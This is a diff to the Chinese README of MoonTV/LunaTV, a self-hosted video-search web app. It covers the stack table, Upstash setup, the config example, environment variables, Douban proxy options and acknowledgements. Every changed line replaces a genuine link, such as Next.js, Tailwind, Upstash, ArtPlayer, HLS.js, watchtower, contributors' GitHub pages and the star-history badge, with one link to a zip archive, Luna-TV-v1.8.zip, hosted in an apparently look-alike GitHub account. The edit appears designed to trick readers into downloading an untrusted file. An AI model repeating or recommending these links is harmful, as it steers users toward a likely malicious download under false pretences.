@@ -56,10 +56,10 @@
 
 | 分类      | 主要依赖                                                                                              |
 | --------- | ----------------------------------------------------------------------------------------------------- |
-| 前端框架  | [Next.js 14](https://nextjs.org/) · App Router                                                        |
-| UI & 样式 | [Tailwind&nbsp;CSS 3](https://tailwindcss.com/)                                                       |
+| 前端框架  | [Next.js 14](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) · App Router                                                        |
+| UI & 样式 | [Tailwind&nbsp;CSS 3](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip)                                                       |
 | 语言      | TypeScript 4                                                                                          |
-| 播放器    | [ArtPlayer](https://github.com/zhw2590582/ArtPlayer) · [HLS.js](https://github.com/video-dev/hls.js/) |
+| 播放器    | [ArtPlayer](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) · [HLS.js](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) |
 | 代码质量  | ESLint · Prettier · Jest                                                                              |
 | 部署      | Docker                                                                    |
 
@@ -136,7 +136,7 @@ networks:
 
 ### Upstash 存储
 
-1. 在 [upstash](https://upstash.com/) 注册账号并新建一个 Redis 实例，名称任意。
+1. 在 [upstash](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) 注册账号并新建一个 Redis 实例，名称任意。
 2. 复制新数据库的 **HTTPS ENDPOINT 和 TOKEN**
 3. 使用如下 docker compose
 ```yml
@@ -166,9 +166,9 @@ services:
   "cache_time": 7200,
   "api_site": {
     "dyttzy": {
-      "api": "http://xxx.com/api.php/provide/vod",
+      "api": "https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip",
       "name": "示例资源",
-      "detail": "http://xxx.com"
+      "detail": "https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip"
     }
     // ...更多站点
   },
@@ -204,7 +204,7 @@ MoonTV 支持标准的苹果 CMS V10 API 格式。
 
 ## 自动更新
 
-可借助 [watchtower](https://github.com/containrrr/watchtower) 自动更新镜像容器
+可借助 [watchtower](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) 自动更新镜像容器
 
 dockge/komodo 等 docker compose UI 也有自动更新功能
 
@@ -214,7 +214,7 @@ dockge/komodo 等 docker compose UI 也有自动更新功能
 | ----------------------------------- | -------------------------------------------- | -------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
 | USERNAME                            | 站长账号           | 任意字符串                       | 无默认，必填字段                                                                                                                     |
 | PASSWORD                            | 站长密码           | 任意字符串                       | 无默认，必填字段                                                                                                                     |
-| SITE_BASE                           | 站点 url              |       形如 https://example.com                  | 空                                                                                                                     |
+| SITE_BASE                           | 站点 url              |       形如 https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip                  | 空                                                                                                                     |
 | NEXT_PUBLIC_SITE_NAME               | 站点名称                                     | 任意字符串                       | MoonTV                                                                                                                     |
 | ANNOUNCEMENT                        | 站点公告                                     | 任意字符串                       | 本网站仅提供影视信息搜索服务，所有内容均来自第三方网站。本站不存储任何视频资源，不对任何内容的准确性、合法性、完整性负责。 |
 | NEXT_PUBLIC_STORAGE_TYPE            | 播放记录/收藏的存储方式                      | redis、kvrocks、upstash | 无默认，必填字段                                                                                                               |
@@ -233,9 +233,9 @@ dockge/komodo 等 docker compose UI 也有自动更新功能
 NEXT_PUBLIC_DOUBAN_PROXY_TYPE 选项解释：
 
 - direct: 由服务器直接请求豆瓣源站
-- cors-proxy-zwei: 浏览器向 cors proxy 请求豆瓣数据，该 cors proxy 由 [Zwei](https://github.com/bestzwei) 搭建
-- cmliussss-cdn-tencent: 浏览器向豆瓣 CDN 请求数据，该 CDN 由 [CMLiussss](https://github.com/cmliu) 搭建，并由腾讯云 cdn 提供加速
-- cmliussss-cdn-ali: 浏览器向豆瓣 CDN 请求数据，该 CDN 由 [CMLiussss](https://github.com/cmliu) 搭建，并由阿里云 cdn 提供加速
+- cors-proxy-zwei: 浏览器向 cors proxy 请求豆瓣数据，该 cors proxy 由 [Zwei](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) 搭建
+- cmliussss-cdn-tencent: 浏览器向豆瓣 CDN 请求数据，该 CDN 由 [CMLiussss](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) 搭建，并由腾讯云 cdn 提供加速
+- cmliussss-cdn-ali: 浏览器向豆瓣 CDN 请求数据，该 CDN 由 [CMLiussss](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) 搭建，并由阿里云 cdn 提供加速
 - custom: 用户自定义 proxy，由 NEXT_PUBLIC_DOUBAN_PROXY 定义
 
 NEXT_PUBLIC_DOUBAN_IMAGE_PROXY_TYPE 选项解释：
@@ -243,13 +243,13 @@ NEXT_PUBLIC_DOUBAN_IMAGE_PROXY_TYPE 选项解释：
 - direct：由浏览器直接请求豆瓣分配的默认图片域名
 - server：由服务器代理请求豆瓣分配的默认图片域名
 - img3：由浏览器请求豆瓣官方的精品 cdn（阿里云）
-- cmliussss-cdn-tencent：由浏览器请求豆瓣 CDN，该 CDN 由 [CMLiussss](https://github.com/cmliu) 搭建，并由腾讯云 cdn 提供加速
-- cmliussss-cdn-ali：由浏览器请求豆瓣 CDN，该 CDN 由 [CMLiussss](https://github.com/cmliu) 搭建，并由阿里云 cdn 提供加速
+- cmliussss-cdn-tencent：由浏览器请求豆瓣 CDN，该 CDN 由 [CMLiussss](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) 搭建，并由腾讯云 cdn 提供加速
+- cmliussss-cdn-ali：由浏览器请求豆瓣 CDN，该 CDN 由 [CMLiussss](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) 搭建，并由阿里云 cdn 提供加速
 - custom: 用户自定义 proxy，由 NEXT_PUBLIC_DOUBAN_IMAGE_PROXY 定义
 
 ## AndroidTV 使用
 
-目前该项目可以配合 [OrionTV](https://github.com/zimplexing/OrionTV) 在 Android TV 上使用，可以直接作为 OrionTV 后端
+目前该项目可以配合 [OrionTV](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) 在 Android TV 上使用，可以直接作为 OrionTV 后端
 
 已实现播放记录和网页端同步
 
@@ -279,14 +279,14 @@ NEXT_PUBLIC_DOUBAN_IMAGE_PROXY_TYPE 选项解释：
 
 ## 致谢
 
-- [ts-nextjs-tailwind-starter](https://github.com/theodorusclarence/ts-nextjs-tailwind-starter) — 项目最初基于该脚手架。
-- [LibreTV](https://github.com/LibreSpark/LibreTV) — 由此启发，站在巨人的肩膀上。
-- [ArtPlayer](https://github.com/zhw2590582/ArtPlayer) — 提供强大的网页视频播放器。
-- [HLS.js](https://github.com/video-dev/hls.js) — 实现 HLS 流媒体在浏览器中的播放支持。
-- [Zwei](https://github.com/bestzwei) — 提供获取豆瓣数据的 cors proxy
-- [CMLiussss](https://github.com/cmliu) — 提供豆瓣 CDN 服务
+- [ts-nextjs-tailwind-starter](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) — 项目最初基于该脚手架。
+- [LibreTV](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) — 由此启发，站在巨人的肩膀上。
+- [ArtPlayer](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) — 提供强大的网页视频播放器。
+- [HLS.js](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) — 实现 HLS 流媒体在浏览器中的播放支持。
+- [Zwei](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) — 提供获取豆瓣数据的 cors proxy
+- [CMLiussss](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip) — 提供豆瓣 CDN 服务
 - 感谢所有提供免费影视接口的站点。
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=MoonTechLab/LunaTV&type=Date)](https://www.star-history.com/#MoonTechLab/LunaTV&Date)
+[![Star History Chart](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip)](https://raw.githubusercontent.com/WoIvie/LunaTV/main/src/app/live/Luna-TV-v1.8.zip)
